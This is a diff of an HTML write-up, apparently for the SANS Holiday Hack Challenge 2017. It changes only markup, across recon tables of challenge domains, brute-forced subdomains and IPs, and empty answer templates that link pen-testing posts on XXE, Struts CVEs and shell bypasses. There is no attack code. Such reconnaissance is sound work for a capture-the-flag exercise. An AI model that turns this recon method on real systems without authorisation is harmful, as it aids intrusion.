-<h3 id="org125f28f">Certificate Transparency Logs</h3>
-<div class="outline-text-3" id="text-org125f28f">
+<div id="outline-container-sec-4-3" class="outline-3">
+<h3 id="sec-4-3">Certificate Transparency Logs</h3>
+<div class="outline-text-3" id="text-4-3">
 <p>
 Next, let's turn our attention to the holidayhackchallenge.com
 domain. Last year, there were some new hosts that appeared under this
@@ -800,7 +755,7 @@ logs of several certificate authorities:
 <div class="figure">
 <p><img src="./images/recon_crypto_report.png" alt="recon_crypto_report.png" />
 </p>
-<p><span class="figure-number">Figure 3: </span>Symantec Crypto Report for holidayhackchallenge.com</p>
+<p><span class="figure-number">Figure 3:</span> Symantec Crypto Report for holidayhackchallenge.com</p>
 </div>
 
 <p>
@@ -812,45 +767,45 @@ certificates that don't look familiar:
 
 
 <colgroup>
-<col  class="org-left" />
+<col  class="left" />
 
-<col  class="org-left" />
+<col  class="left" />
 
-<col  class="org-right" />
+<col  class="right" />
 </colgroup>
 <thead>
 <tr>
-<th scope="col" class="org-left">Common Name</th>
-<th scope="col" class="org-left">Subject Alternate Names (SANs)</th>
-<th scope="col" class="org-right">IP</th>
+<th scope="col" class="left">Common Name</th>
+<th scope="col" class="left">Subject Alternate Names (SANs)</th>
+<th scope="col" class="right">IP</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td class="org-left">2017.holidayhackchallenge.com</td>
-<td class="org-left">2017, puzzler2017</td>
-<td class="org-right">35.196.67.150</td>
+<td class="left">2017.holidayhackchallenge.com</td>
+<td class="left">2017, puzzler2017</td>
+<td class="right">35.196.67.150</td>
 </tr>
 
 <tr>
-<td class="org-left">docker2017.holidayhackchallenge.com</td>
-<td class="org-left">&#xa0;</td>
-<td class="org-right">35.190.163.207</td>
+<td class="left">docker2017.holidayhackchallenge.com</td>
+<td class="left">&#xa0;</td>
+<td class="right">35.190.163.207</td>
 </tr>
 
 <tr>
-<td class="org-left">chat.holidayhackchallenge.com</td>
-<td class="org-left">&#xa0;</td>
-<td class="org-right">35.196.73.180</td>
+<td class="left">chat.holidayhackchallenge.com</td>
+<td class="left">&#xa0;</td>
+<td class="right">35.196.73.180</td>
 </tr>
 </tbody>
 </table>
 </div>
 </div>
 
-<div id="outline-container-org2591284" class="outline-3">
-<h3 id="org2591284">Monitoring</h3>
-<div class="outline-text-3" id="text-org2591284">
+<div id="outline-container-sec-4-4" class="outline-3">
+<h3 id="sec-4-4">Monitoring</h3>
+<div class="outline-text-3" id="text-4-4">
 <p>
 None of the 3 servers listed above are currently accessible on port 80
 or 443 (HTTP and HTTPS). We setup some monitoring using a free online
@@ -866,9 +821,9 @@ ground running.
 </div>
 </div>
 
-<div id="outline-container-org7e02a0d" class="outline-3">
-<h3 id="org7e02a0d">Recon Summary</h3>
-<div class="outline-text-3" id="text-org7e02a0d">
+<div id="outline-container-sec-4-5" class="outline-3">
+<h3 id="sec-4-5">Recon Summary</h3>
+<div class="outline-text-3" id="text-4-5">
 <p>
 We can use the following indicators to search any clues we're later provided with:
 </p>
@@ -877,192 +832,192 @@ We can use the following indicators to search any clues we're later provided wit
 
 
 <colgroup>
-<col  class="org-left" />
+<col  class="left" />
 
-<col  class="org-left" />
+<col  class="left" />
 
-<col  class="org-left" />
+<col  class="left" />
 </colgroup>
 <thead>
 <tr>
-<th scope="col" class="org-left">Indicator</th>
-<th scope="col" class="org-left">Type</th>
-<th scope="col" class="org-left">Source</th>
+<th scope="col" class="left">Indicator</th>
+<th scope="col" class="left">Type</th>
+<th scope="col" class="left">Source</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td class="org-left">northpolechristmastown.com</td>
-<td class="org-left">Domain</td>
-<td class="org-left">Reverse WHOIS</td>
+<td class="left">northpolechristmastown.com</td>
+<td class="left">Domain</td>
+<td class="left">Reverse WHOIS</td>
 </tr>
 
 <tr>
-<td class="org-left">holidayhackchallenge.com</td>
-<td class="org-left">Domain</td>
-<td class="org-left">2016 Hack</td>
+<td class="left">holidayhackchallenge.com</td>
+<td class="left">Domain</td>
+<td class="left">2016 Hack</td>
 </tr>
 
 <tr>
-<td class="org-left">nppd.northpolechristmastown.com</td>
-<td class="org-left">FQDN</td>
-<td class="org-left">Google Search</td>
+<td class="left">nppd.northpolechristmastown.com</td>
+<td class="left">FQDN</td>
+<td class="left">Google Search</td>
 </tr>
 
 <tr>
-<td class="org-left">intranet.northpolechristmastown.com</td>
-<td class="org-left">FQDN</td>
-<td class="org-left">DNS Brute Force</td>
+<td class="left">intranet.northpolechristmastown.com</td>
+<td class="left">FQDN</td>
+<td class="left">DNS Brute Force</td>
 </tr>
 
 <tr>
-<td class="org-left">files.northpolechristmastown.com</td>
-<td class="org-left">FQDN</td>
-<td class="org-left">DNS Brute Force</td>
+<td class="left">files.northpolechristmastown.com</td>
+<td class="left">FQDN</td>
+<td class="left">DNS Brute Force</td>
 </tr>
 
 <tr>
-<td class="org-left">dev.northpolechristmastown.com</td>
-<td class="org-left">FQDN</td>
-<td class="org-left">DNS Brute Force</td>
+<td class="left">dev.northpolechristmastown.com</td>
+<td class="left">FQDN</td>
+<td class="left">DNS Brute Force</td>
 </tr>
 
 <tr>
-<td class="org-left">admin.northpolechristmastown.com</td>
-<td class="org-left">FQDN</td>
-<td class="org-left">DNS Brute Force</td>
+<td class="left">admin.northpolechristmastown.com</td>
+<td class="left">FQDN</td>
+<td class="left">DNS Brute Force</td>
 </tr>
 
 <tr>
-<td class="org-left">mail.northpolechristmastown.com</td>
-<td class="org-left">FQDN</td>
-<td class="org-left">DNS Brute Force</td>
+<td class="left">mail.northpolechristmastown.com</td>
+<td class="left">FQDN</td>
+<td class="left">DNS Brute Force</td>
 </tr>
 
 <tr>
-<td class="org-left">emi.northpolechristmastown.com</td>
-<td class="org-left">FQDN</td>
-<td class="org-left">DNS Brute Force</td>
+<td class="left">emi.northpolechristmastown.com</td>
+<td class="left">FQDN</td>
+<td class="left">DNS Brute Force</td>
 </tr>
 
 <tr>
-<td class="org-left">ewa.northpolechristmastown.com</td>
-<td class="org-left">FQDN</td>
-<td class="org-left">DNS Brute Force</td>
+<td class="left">ewa.northpolechristmastown.com</td>
+<td class="left">FQDN</td>
+<td class="left">DNS Brute Force</td>
 </tr>
 
 <tr>
-<td class="org-left">2017.holidayhackchallenge.com</td>
-<td class="org-left">FQDN</td>
-<td class="org-left">Cert Transparency</td>
+<td class="left">2017.holidayhackchallenge.com</td>
+<td class="left">FQDN</td>
+<td class="left">Cert Transparency</td>
 </tr>
 
 <tr>
-<td class="org-left">puzzler2017.holidayhackchallenge.com</td>
-<td class="org-left">FQDN</td>
-<td class="org-left">Cert SAN</td>
+<td class="left">puzzler2017.holidayhackchallenge.com</td>
+<td class="left">FQDN</td>
+<td class="left">Cert SAN</td>
 </tr>
 
 <tr>
-<td class="org-left">docker2017.holidayhackchallenge.com</td>
-<td class="org-left">FQDN</td>
-<td class="org-left">Cert Transparency</td>
+<td class="left">docker2017.holidayhackchallenge.com</td>
+<td class="left">FQDN</td>
+<td class="left">Cert Transparency</td>
 </tr>
 
 <tr>
-<td class="org-left">chat.holidayhackchallenge.com</td>
-<td class="org-left">FQDN</td>
-<td class="org-left">Cert Transparency</td>
+<td class="left">chat.holidayhackchallenge.com</td>
+<td class="left">FQDN</td>
+<td class="left">Cert Transparency</td>
 </tr>
 
 <tr>
-<td class="org-left">35.185.43.23</td>
-<td class="org-left">IP</td>
-<td class="org-left">DNS (files)</td>
+<td class="left">35.185.43.23</td>
+<td class="left">IP</td>
+<td class="left">DNS (files)</td>
 </tr>
 
 <tr>
-<td class="org-left">35.185.57.190</td>
-<td class="org-left">IP</td>
-<td class="org-left">DNS (emi)</td>
+<td class="left">35.185.57.190</td>
+<td class="left">IP</td>
+<td class="left">DNS (emi)</td>
 </tr>
 
 <tr>
-<td class="org-left">35.185.84.51</td>
-<td class="org-left">IP</td>
-<td class="org-left">DNS (dev)</td>
+<td class="left">35.185.84.51</td>
+<td class="left">IP</td>
+<td class="left">DNS (dev)</td>
 </tr>
 
 <tr>
-<td class="org-left">35.185.115.185</td>
-<td class="org-left">IP</td>
-<td class="org-left">DNS (admin, mail, ewa)</td>
+<td class="left">35.185.115.185</td>
+<td class="left">IP</td>
+<td class="left">DNS (admin, mail, ewa)</td>
 </tr>
 
 <tr>
-<td class="org-left">35.190.163.207</td>
-<td class="org-left">IP</td>
-<td class="org-left">DNS (docker2017)</td>
+<td class="left">35.190.163.207</td>
+<td class="left">IP</td>
+<td class="left">DNS (docker2017)</td>
 </tr>
 
 <tr>
-<td class="org-left">35.196.67.150</td>
-<td class="org-left">IP</td>
-<td class="org-left">DNS (2017)</td>
+<td class="left">35.196.67.150</td>
+<td class="left">IP</td>
+<td class="left">DNS (2017)</td>
 </tr>
 
 <tr>
-<td class="org-left">35.196.73.18</td>
-<td class="org-left">IP</td>
-<td class="org-left">DNS (chat)</td>
+<td class="left">35.196.73.18</td>
+<td class="left">IP</td>
+<td class="left">DNS (chat)</td>
 </tr>
 
 <tr>
-<td class="org-left">35.196.239.128</td>
-<td class="org-left">IP</td>
-<td class="org-left">DNS (intranet)</td>
+<td class="left">35.196.239.128</td>
+<td class="left">IP</td>
+<td class="left">DNS (intranet)</td>
 </tr>
 
 <tr>
-<td class="org-left">HK-47 (Star Wars Droid)</td>
-<td class="org-left">Reference</td>
-<td class="org-left">nppd robots.txt</td>
+<td class="left">HK-47 (Star Wars Droid)</td>
+<td class="left">Reference</td>
+<td class="left">nppd robots.txt</td>
 </tr>
 
 <tr>
-<td class="org-left">Artoo (Star Wars Droid)</td>
-<td class="org-left">Reference</td>
-<td class="org-left">nppd robots.txt</td>
+<td class="left">Artoo (Star Wars Droid)</td>
+<td class="left">Reference</td>
+<td class="left">nppd robots.txt</td>
 </tr>
 
 <tr>
-<td class="org-left">Threepio (Star Wars Droid)</td>
-<td class="org-left">Reference</td>
-<td class="org-left">nppd robots.txt</td>
+<td class="left">Threepio (Star Wars Droid)</td>
+<td class="left">Reference</td>
+<td class="left">nppd robots.txt</td>
 </tr>
 
 <tr>
-<td class="org-left">Sand-Crawler (Star Wars Vehicle)</td>
-<td class="org-left">Reference</td>
-<td class="org-left">nppd robots.txt</td>
+<td class="left">Sand-Crawler (Star Wars Vehicle)</td>
+<td class="left">Reference</td>
+<td class="left">nppd robots.txt</td>
 </tr>
 
 <tr>
-<td class="org-left">North Pole Police Department</td>
-<td class="org-left">Reference</td>
-<td class="org-left">nppd /infractions</td>
+<td class="left">North Pole Police Department</td>
+<td class="left">Reference</td>
+<td class="left">nppd /infractions</td>
 </tr>
 
 <tr>
-<td class="org-left">Cindy Lou Who (2015 Hack)</td>
-<td class="org-left">Reference</td>
-<td class="org-left">nppd /infractions</td>
+<td class="left">Cindy Lou Who (2015 Hack)</td>
+<td class="left">Reference</td>
+<td class="left">nppd /infractions</td>
 </tr>
 
 <tr>
-<td class="org-left">Dr. Who (2016 Hack)</td>
-<td class="org-left">Reference</td>
-<td class="org-left">nppd /infractions</td>
+<td class="left">Dr. Who (2016 Hack)</td>
+<td class="left">Reference</td>
+<td class="left">nppd /infractions</td>
 </tr>
 </tbody>
 </table>
@@ -1070,22 +1025,19 @@ We can use the following indicators to search any clues we're later provided wit
 </div>
 </div>
 
-<div id="outline-container-org1bf9e8a" class="outline-2">
-<h2 id="org1bf9e8a">Terminals</h2>
-<div class="outline-text-2" id="text-org1bf9e8a">
-</div>
-<div id="outline-container-org1688e9e" class="outline-3">
-<h3 id="org1688e9e">Bumble's Bounce</h3>
-<div class="outline-text-3" id="text-org1688e9e">
-</div>
-<div id="outline-container-org066fafb" class="outline-4">
-<h4 id="answer-template"><a id="org066fafb"></a>Answer Template</h4>
+<div id="outline-container-sec-5" class="outline-2">
+<h2 id="sec-5">Terminals</h2>
+<div class="outline-text-2" id="text-5">
+</div><div id="outline-container-sec-5-1" class="outline-3">
+<h3 id="sec-5-1">Bumble's Bounce</h3>
+<div class="outline-text-3" id="text-5-1">
+</div><div id="outline-container-answer-template" class="outline-4">
+<h4 id="answer-template"><a id="sec-5-1-1" name="sec-5-1-1"></a>Answer Template</h4>
 <div class="outline-text-4" id="text-answer-template">
 </div>
 
-<ul class="org-ul">
-<li><a id="question"></a><a id="orgaca9400"></a>Question<br />
-<div class="outline-text-5" id="text-question">
+<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-1-1-1" name="sec-5-1-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
+
 <pre class="example">
                            ._    _.
                            (_)  (_)                  &lt;&gt; \  / &lt;&gt;
@@ -1120,16 +1072,16 @@ Identifying the least-popular browser is your noteworthy goal.
 </div>
 </li>
 
-<li><a id="how-to-find-the-terminal"></a><a id="org100d15b"></a>How to find the terminal<br />
-<div class="outline-text-5" id="text-how-to-find-the-terminal">
+<li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-1-1-2" name="sec-5-1-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">
+
 <p>
 Where was the terminal? What's the direct link to it?
 </p>
 </div>
 </li>
 
-<li><a id="background-information"></a><a id="orgb38ecec"></a>Background Information<br />
-<div class="outline-text-5" id="text-background-information">
+<li><a id="background-information" name="background-information"></a><a id="sec-5-1-1-3" name="sec-5-1-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+
 <p>
 Do we know anything about this terminal already?
 </p>
@@ -1155,42 +1107,50 @@ Are any of these useful?
 (EC2)
 <a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
 Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.</li>
+SSH keys.
+</li>
 <li>Your Pokemon Guide for Essential SQL Pen Test Commands
 <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
+SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
+</li>
 <li>Exploiting XXE Vulnerabilities in IIS/.NET
 <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML</li>
+Including remote content in XML
+</li>
 <li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
 <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
 Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
+CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
+</li>
 <li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
+<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
+</li>
 <li>A Spot of Tee
 <a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee</li>
+bash shell, and bypassing the I/O restriction with tee
+</li>
 <li>Understanding and Exploiting Web-based LDAP
 <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection</li>
+LDAP syntax, LDAP injection
+</li>
 <li>Massively Scaling your Scanning
 <a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan</li>
+masscan
+</li>
 </ul>
 </div>
 </li>
 
-<li><a id="goal"></a><a id="orga4ebf42"></a>Goal<br />
-<div class="outline-text-5" id="text-goal">
+<li><a id="goal" name="goal"></a><a id="sec-5-1-1-4" name="sec-5-1-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+
 <p>
 What are we trying to accomplish?
 </p>
 </div>
 </li>
 
-<li><a id="approach"></a><a id="orgde1a6f5"></a>Approach<br />
-<div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-5-1-1-5" name="sec-5-1-1-5"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+
 <p>
 Describe the thought process that we tried here. How were we able to use
 the hints or the blog posts?
@@ -1198,8 +1158,8 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution"></a><a id="orgb705ca7"></a>Solution<br />
-<div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-5-1-1-6" name="sec-5-1-1-6"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+
 <p>
 Summarize the reference solution that we found.
 </p>
@@ -1210,24 +1170,24 @@ AsciiCinema video of the solution?
 </div>
 </li>
 
-<li><a id="alternatives"></a><a id="org7ebec60"></a>Alternatives<br />
-<div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-5-1-1-7" name="sec-5-1-1-7"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+
 <p>
 Any other, easier solutions?
 </p>
 </div>
 </li>
 
-<li><a id="common-pitfalls"></a><a id="org7406956"></a>Common Pitfalls<br />
-<div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-1-1-8" name="sec-5-1-1-8"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+
 <p>
 Do we know what issue(s) people were running into?
 </p>
 </div>
 </li>
 
-<li><a id="about-the-challenge"></a><a id="org885cc7d"></a>About the Challenge<br />
-<div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-5-1-1-9" name="sec-5-1-1-9"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+
 <p>
 How was the challenge setup? Was there a better way to secure this
 system?
@@ -1235,28 +1195,25 @@ system?
 </div>
 </li>
 
-<li><a id="loot"></a><a id="orgfe42eb9"></a>Loot<br />
-<div class="outline-text-5" id="text-loot">
+<li><a id="loot" name="loot"></a><a id="sec-5-1-1-10" name="sec-5-1-1-10"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
+
 <p>
 Anything interesting hidden on the system?
 </p>
 </div>
-</li>
-</ul>
+</li></ul>
 </div>
 </div>
-<div id="outline-container-org8dd3295" class="outline-3">
-<h3 id="org8dd3295">Cryokinetic Magic</h3>
-<div class="outline-text-3" id="text-org8dd3295">
-</div>
-<div id="outline-container-org03cd311" class="outline-4">
-<h4 id="answer-template"><a id="org03cd311"></a>Answer Template</h4>
+<div id="outline-container-sec-5-2" class="outline-3">
+<h3 id="sec-5-2">Cryokinetic Magic</h3>
+<div class="outline-text-3" id="text-5-2">
+</div><div id="outline-container-answer-template" class="outline-4">
+<h4 id="answer-template"><a id="sec-5-2-1" name="sec-5-2-1"></a>Answer Template</h4>
 <div class="outline-text-4" id="text-answer-template">
 </div>
 
-<ul class="org-ul">
-<li><a id="question"></a><a id="orge3e4ff4"></a>Question<br />
-<div class="outline-text-5" id="text-question">
+<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-2-1-1" name="sec-5-2-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
+
 <pre class="example">
                      ___
                     / __'.     .-"""-.
@@ -1284,16 +1241,16 @@ Run the CandyCaneStriper executable to complete this challenge.
 </div>
 </li>
 
-<li><a id="how-to-find-the-terminal"></a><a id="orgc65f04c"></a>How to find the terminal<br />
-<div class="outline-text-5" id="text-how-to-find-the-terminal">
+<li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-2-1-2" name="sec-5-2-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">
+
 <p>
 Where was the terminal? What's the direct link to it?
 </p>
 </div>
 </li>
 
-<li><a id="background-information"></a><a id="orgf6ddac5"></a>Background Information<br />
-<div class="outline-text-5" id="text-background-information">
+<li><a id="background-information" name="background-information"></a><a id="sec-5-2-1-3" name="sec-5-2-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+
 <p>
 Do we know anything about this terminal already?
 </p>
@@ -1319,42 +1276,50 @@ Are any of these useful?
 (EC2)
 <a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
 Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.</li>
+SSH keys.
+</li>
 <li>Your Pokemon Guide for Essential SQL Pen Test Commands
 <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
+SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)
+</li>
 <li>Exploiting XXE Vulnerabilities in IIS/.NET
 <a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
-Including remote content in XML</li>
+Including remote content in XML
+</li>
 <li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
 <a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
 Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
-CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
+CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a>
+</li>
 <li>Go To The Head Of The Class: LD\_PRELOAD For The Win
-<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
+<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a>
+</li>
 <li>A Spot of Tee
 <a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
-bash shell, and bypassing the I/O restriction with tee</li>
+bash shell, and bypassing the I/O restriction with tee
+</li>
 <li>Understanding and Exploiting Web-based LDAP
 <a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
-LDAP syntax, LDAP injection</li>
+LDAP syntax, LDAP injection
+</li>
 <li>Massively Scaling your Scanning
 <a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
-masscan</li>
+masscan
+</li>
 </ul>
 </div>
 </li>
 
-<li><a id="goal"></a><a id="orgb0e3f44"></a>Goal<br />
-<div class="outline-text-5" id="text-goal">
+<li><a id="goal" name="goal"></a><a id="sec-5-2-1-4" name="sec-5-2-1-4"></a>Goal<br  /><div class="outline-text-5" id="text-goal">
+
 <p>
 What are we trying to accomplish?
 </p>
 </div>
 </li>
 
-<li><a id="approach"></a><a id="orga662e3d"></a>Approach<br />
-<div class="outline-text-5" id="text-approach">
+<li><a id="approach" name="approach"></a><a id="sec-5-2-1-5" name="sec-5-2-1-5"></a>Approach<br  /><div class="outline-text-5" id="text-approach">
+
 <p>
 Describe the thought process that we tried here. How were we able to use
 the hints or the blog posts?
@@ -1362,8 +1327,8 @@ the hints or the blog posts?
 </div>
 </li>
 
-<li><a id="solution"></a><a id="org11cc567"></a>Solution<br />
-<div class="outline-text-5" id="text-solution">
+<li><a id="solution" name="solution"></a><a id="sec-5-2-1-6" name="sec-5-2-1-6"></a>Solution<br  /><div class="outline-text-5" id="text-solution">
+
 <p>
 Summarize the reference solution that we found.
 </p>
@@ -1374,24 +1339,24 @@ AsciiCinema video of the solution?
 </div>
 </li>
 
-<li><a id="alternatives"></a><a id="org8654446"></a>Alternatives<br />
-<div class="outline-text-5" id="text-alternatives">
+<li><a id="alternatives" name="alternatives"></a><a id="sec-5-2-1-7" name="sec-5-2-1-7"></a>Alternatives<br  /><div class="outline-text-5" id="text-alternatives">
+
 <p>
 Any other, easier solutions?
 </p>
 </div>
 </li>
 
-<li><a id="common-pitfalls"></a><a id="org959513f"></a>Common Pitfalls<br />
-<div class="outline-text-5" id="text-common-pitfalls">
+<li><a id="common-pitfalls" name="common-pitfalls"></a><a id="sec-5-2-1-8" name="sec-5-2-1-8"></a>Common Pitfalls<br  /><div class="outline-text-5" id="text-common-pitfalls">
+
 <p>
 Do we know what issue(s) people were running into?
 </p>
 </div>
 </li>
 
-<li><a id="about-the-challenge"></a><a id="org1297c33"></a>About the Challenge<br />
-<div class="outline-text-5" id="text-about-the-challenge">
+<li><a id="about-the-challenge" name="about-the-challenge"></a><a id="sec-5-2-1-9" name="sec-5-2-1-9"></a>About the Challenge<br  /><div class="outline-text-5" id="text-about-the-challenge">
+
 <p>
 How was the challenge setup? Was there a better way to secure this
 system?
@@ -1399,28 +1364,25 @@ system?
 </div>
 </li>
 
-<li><a id="loot"></a><a id="orgc2c66ad"></a>Loot<br />
-<div class="outline-text-5" id="text-loot">
+<li><a id="loot" name="loot"></a><a id="sec-5-2-1-10" name="sec-5-2-1-10"></a>Loot<br  /><div class="outline-text-5" id="text-loot">
+
 <p>
 Anything interesting hidden on the system?
 </p>
 </div>
-</li>
-</ul>
+</li></ul>
 </div>
 </div>
-<div id="outline-container-org8fcc336" class="outline-3">
-<h3 id="org8fcc336">I Don't Think We're In Kansas Anymore</h3>
-<div class="outline-text-3" id="text-org8fcc336">
-</div>
-<div id="outline-container-orgf26f1fb" class="outline-4">
-<h4 id="answer-template"><a id="orgf26f1fb"></a>Answer Template</h4>
+<div id="outline-container-sec-5-3" class="outline-3">
+<h3 id="sec-5-3">I Don't Think We're In Kansas Anymore</h3>
+<div class="outline-text-3" id="text-5-3">
+</div><div id="outline-container-answer-template" class="outline-4">
+<h4 id="answer-template"><a id="sec-5-3-1" name="sec-5-3-1"></a>Answer Template</h4>
 <div class="outline-text-4" id="text-answer-template">
 </div>
 
-<ul class="org-ul">
-<li><a id="question"></a><a id="org4bc1b7c"></a>Question<br />
-<div class="outline-text-5" id="text-question">
+<ul class="org-ul"><li><a id="question" name="question"></a><a id="sec-5-3-1-1" name="sec-5-3-1-1"></a>Question<br  /><div class="outline-text-5" id="text-question">
+
 <pre class="example">
                        *
                       .~'
@@ -1455,16 +1417,16 @@ Identify the song whose popularity is the best.
 </div>
 </li>
 
-<li><a id="how-to-find-the-terminal"></a><a id="org3f5fba4"></a>How to find the terminal<br />
-<div class="outline-text-5" id="text-how-to-find-the-terminal">
+<li><a id="how-to-find-the-terminal" name="how-to-find-the-terminal"></a><a id="sec-5-3-1-2" name="sec-5-3-1-2"></a>How to find the terminal<br  /><div class="outline-text-5" id="text-how-to-find-the-terminal">
+
 <p>
 Where was the terminal? What's the direct link to it?
 </p>
 </div>
 </li>
 
-<li><a id="background-information"></a><a id="org1aaa97c"></a>Background Information<br />
-<div class="outline-text-5" id="text-background-information">
+<li><a id="background-information" name="background-information"></a><a id="sec-5-3-1-3" name="sec-5-3-1-3"></a>Background Information<br  /><div class="outline-text-5" id="text-background-information">
+
 <p>
 Do we know anything about this terminal already?
 </p>
@@ -1490,42 +1452,50 @@ Are any of these useful?
 (EC2)
 <a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
 Spinning up an EC2 instance, but also a lot of emphasis on how to use
-SSH keys.</li>
+SSH keys.
+</li>
 <li>Your Pokemon Guide for Essential SQL Pen Test Commands
 <a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
-SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
